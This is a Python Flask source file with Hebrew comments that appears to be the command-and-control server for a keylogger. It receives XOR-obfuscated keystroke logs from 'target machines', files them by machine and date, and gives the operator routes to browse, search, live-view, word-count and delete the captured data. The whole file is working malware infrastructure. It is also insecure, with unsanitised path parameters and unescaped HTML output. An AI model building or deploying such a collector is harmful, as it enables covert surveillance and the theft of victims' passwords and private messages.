from flask import Flask, jsonify, request, render_template
import os, time, json
from datetime import datetime
from Enkryptor import Encryptor
a = Encryptor()
app = Flask(__name__)
app.last_content = None
text = ''


# DATA_FOLDER יכיל את הנתיב המלא לתיקייה הראשית
DATA_FOLDER = os.path.abspath("data")
os.makedirs(DATA_FOLDER, exist_ok=True)

@app.route('/')
def home():
    return render_template('First_page.html')

@app.route('/main')
def main():
    return render_template('Main_page.html')

@app.route('/api/keylogges', methods=['POST'])
def upload():
    global text
    # קבלת JSON
    encrypted_data = request.get_json(silent=True)
    encrypted_data = json.loads(encrypted_data)
    #ביטול ההצפנה
    data = json.loads(a.encryption_using_xor(encrypted_data['data'],4))
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid data"}), 400
    
    machine = data["machine"]
    content = data["data"]
    sent_time = data["time"]

    last_content = content

    #קבלת תאריך ושעה נוכחיים
    now = datetime.now()
    year = now.strftime("%Y")
    month = now.strftime("%m")
    day = now.strftime("%d")
    now = now.strftime("%H:%M:%S")
    

    # מבנה תיקיות: DATA_FOLDER/machine/year/month/
    machine_folder = os.path.join(DATA_FOLDER, machine, year, month)
    os.makedirs(machine_folder, exist_ok=True)

    # קובץ יומי: day.txt
    file_path = os.path.join(machine_folder, f"{day}.txt")
    content = json.dumps({'time':now, 'data':content})
    if content:
        text += content
    # כתיבת הנתונים לקובץ
    with open(file_path, "a", encoding="utf-8") as f:  
        f.write(content)

    return jsonify({"status": "success", "file": file_path}), 200

@app.route('/machine')
def open_search():
    return render_template('search_machine.html')

@app.route("/api/live", methods=["GET"])
def live_view():
    if app.last_content is None:
        return jsonify({"status": "no data yet"}), 200
    return jsonify({"status": "success", "data": app.last_content}), 200

@app.route("/machines")
def get_target_machines_list():
    machines = []
    data_folder = DATA_FOLDER
    if not os.path.exists(DATA_FOLDER):
        return "No machines found"

    for machine in os.listdir(DATA_FOLDER):
        machines.append(machine)
    return json.dumps(machines)

from flask import jsonify

@app.route('/live')
def get_live():
    global text 
    return f"<h1>{text}</h1>"

@app.route("/data/<machine>/years")
def get_years_list(machine):
    global DATA_FOLDER
    machine_folder = os.path.join(DATA_FOLDER, machine)

    if not os.path.exists(machine_folder):
        # מחזירים JSON ולא מחרוזת
        return jsonify({"error": "Machine not found"}), 404

    years = [year for year in os.listdir(machine_folder)]
    return jsonify(years)   # זה מחזיר JSON תקין


@app.route("/data/<machine>/<year>/months")
def get_months_list(machine, year): 
    months = []
    year_folder = os.path.join(DATA_FOLDER, machine, year)
    if not os.path.exists(year_folder):
        return "Year not found", 404

    for month in os.listdir(year_folder):
        months.append(month)
    return json.dumps(months)

@app.route("/data/<machine>/<year>/<month>/days")
def get_days_list(machine, year, month):
    days = []
    month_folder = os.path.join(DATA_FOLDER, machine, year, month)
    if not os.path.exists(month_folder):
        return "Month not found", 404

    for day_file in os.listdir(month_folder):
        if day_file.endswith(".txt"):
            days.append(day_file[:-4])  # Remove .txt extension
    return json.dumps(days)


@app.route("/data/<machine>/<year>/<month>/<day>")
def get_day_data(machine, year, month, day):
    global DATA_FOLDER    
    day_file_path = os.path.join(DATA_FOLDER, machine, year, month, f"{day}.txt")

    # אם הקובץ לא קיים
    if not os.path.exists(day_file_path):
        return jsonify({"error": "Day not found"}), 404

    # קריאת התוכן
    with open(day_file_path, "r", encoding="utf-8") as f:
        content = f.read()

    # מחזירים JSON מסודר
    return jsonify({
        "machine": machine,
        "year": year,
        "month": month,
        "day": day,
        "content": content
    })



@app.route("/data/<machine>/<year>/<month>/<day>/delete", methods=["DELETE"])
def delete_data_file(machine, year, month, day):
    global DATA_FOLDER
    day_file_path = os.path.join(DATA_FOLDER, machine, year, month, f"{day}.txt")
    
    if os.path.exists(day_file_path):
        os.remove(day_file_path)
        return '1'
    return '0'

@app.route("/data/<machine>/delete", methods=["DELETE"])
def delete_machine_data(machine):
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if os.path.exists(machine_folder):
        for root, dirs, files in os.walk(machine_folder, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(machine_folder)
        return True
    return False

@app.route("/data/delete_all", methods=["DELETE"])
def delete_all_data():
    if os.path.exists(DATA_FOLDER):
        for root, dirs, files in os.walk(DATA_FOLDER, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        return True
    return False


import shutil


@app.route("/data/<machine>/<year>/delete", methods=["DELETE"])
def delete_year(machine, year):
    year_folder = os.path.join(DATA_FOLDER, machine, year)

    if not os.path.exists(year_folder):
        return jsonify({"success": False, "message": "Folder not found"}), 404

    try:
        shutil.rmtree(year_folder)  # מוחק את כל התיקייה בבת אחת
        return jsonify({"success": True, "message": f"Deleted {year_folder}"}), 200
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/data/<machine>/<year>/<month>/delete", methods=["DELETE"])
def delete_month(machine, year, month):
    month_folder = os.path.join(DATA_FOLDER, machine, year, month)
    if os.path.exists(month_folder):
        for root, dirs, files in os.walk(month_folder, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(month_folder)
        return True
    return False

DATA_ROOT = "data" 





DATA_ROOT = r"C:\Users\Yosef\keyLogger\data"  # הנתיב האמיתי למידע

@app.route("/api/search/<start>/<end>", methods=["GET"])
def collect_data(start, end):
    try:
        start_dt = datetime.fromisoformat(start)
        end_dt = datetime.fromisoformat(end)
    except ValueError:
        return jsonify({"error": "Invalid date format. Use ISO format like 2025-09-01T00:00:00"}), 400

    if not os.path.isdir(DATA_ROOT):
        return jsonify({"error": f"Root path not found: {DATA_ROOT}"}), 404

    result = []

    for machine in os.listdir(DATA_ROOT):
        machine_path = os.path.join(DATA_ROOT, machine)
        if not os.path.isdir(machine_path):
            continue

        for year in os.listdir(machine_path):
            year_path = os.path.join(machine_path, year)
            if not os.path.isdir(year_path):
                continue

            for month in os.listdir(year_path):
                month_path = os.path.join(year_path, month)
                if not os.path.isdir(month_path):
                    continue

                for day_file in os.listdir(month_path):
                    day_path = os.path.join(month_path, day_file)
                    if not os.path.isfile(day_path):
                        continue

                    try:
                        day_num = day_file.split(".")[0]  # "03" מתוך "03.txt"
                        file_date = datetime(int(year), int(month), int(day_num))
                    except Exception:
                        continue

                    with open(day_path, encoding="utf-8") as f:
                        for line in f:
                            if not line.strip():
                                continue
                            try:
                                t_str, content = line.split("]", 1)
                                t = datetime.strptime(t_str.strip("["), "%H:%M:%S")
                                dt = datetime(file_date.year, file_date.month, file_date.day,
                                              t.hour, t.minute, t.second)
                                if start_dt <= dt <= end_dt:
                                    result.append({
                                        "machine": machine,
                                        "datetime": dt.isoformat(),
                                        "content": content.strip()
                                    })
                            except Exception as e:
                                print("Error parsing line:", line, e)

    return jsonify(result)



from collections import Counter
import re
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

@app.route("/most_frequent/<machine>/<year>/<month>/<day>")
def most_frequent_word(machine, year, month,day):
    # בונים נתיב לקובץ
    file_path = os.path.join(DATA_FOLDER, machine, year, month, day)

    if not os.path.exists(file_path):
        return jsonify({"error": "File not found"}), 404

    words = []
    try:
        with open(file_path, encoding="utf-8") as f:
            for line in f:
                if line.strip():
                    try:
                        # מפרידים את ה־[תאריך]
                        _, content = line.split("]", 1)
                    except ValueError:
                        content = line
                    # מפרקים למילים (מורידים סימני פיסוק, הכל לאותיות קטנות)
                    tokens = re.findall(r"\w+", content.lower())
                    words.extend(tokens)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    if not words:
        return jsonify({"error": "No words found"}), 404

    # מונים תדירות
    counter = Counter(words)
    most_common_word, freq = counter.most_common(1)[0]

    return jsonify({
        "most_frequent_word": most_common_word,
        "frequency": freq
    })





# @app.route("/data/<machine>/delete1", methods=["DELETE"])
# def delete_machine_data(machine):
#     machine_folder = os.path.join(DATA_FOLDER, machine)
#     if os.path.exists(machine_folder):
#         for root, dirs, files in os.walk(machine_folder, topdown=False):
#             for name in files:
#                 os.remove(os.path.join(root, name))
#             for name in dirs:
#                 os.rmdir(os.path.join(root, name))
#         os.rmdir(machine_folder)
#         return jsonify({"success": True, "message": f"Machine {machine} deleted"}), 200
#     return jsonify({"error": "Machine not found"}), 404


if __name__ == '__main__':
    app.run(debug=True)